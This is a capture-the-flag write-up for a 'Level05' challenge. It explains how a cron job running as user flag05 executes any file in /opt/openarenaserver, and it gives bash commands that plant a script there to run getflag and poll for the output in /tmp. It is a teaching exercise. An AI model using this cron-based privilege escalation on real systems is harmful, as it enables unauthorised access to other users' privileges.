# Level05 Exploit

In this challenge, we've discovered a cronjob running as user `flag05` that executes the script `/usr/sbin/openarenaserver` every 2 minutes. Additionally, we have access to the script `/usr/sbin/openarenaserver`, which executes all files within the directory `/opt/openarenaserver`.

## Vulnerability Analysis

The script `/usr/sbin/openarenaserver` iterates through files in `/opt/openarenaserver` and executes them with a limited CPU time. This presents an opportunity for exploitation, as we can create a file within `/opt/openarenaserver` that executes getflag and saves the output to a file.

## Exploit Procedure

To exploit this vulnerability and retrieve the flag, we can create a file named flag within `/opt/openarenaserver` that executes getflag and saves the output to `/tmp/flag05`. Here's how we can accomplish this:

```bash
# Create a script within /opt/openarenaserver to execute getflag and save the output
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag
chmod +x /opt/openarenaserver/flag

# Continuously check for the existence of /tmp/flag05 and print its contents once available
while :;
do
  if [ -f "/tmp/flag05" ]; then
    cat /tmp/flag05
    break
  fi
  sleep 10
done
```

This script continuously checks for the existence of `/tmp/flag05`. Once the file is found, it prints its contents, which should contain the flag.
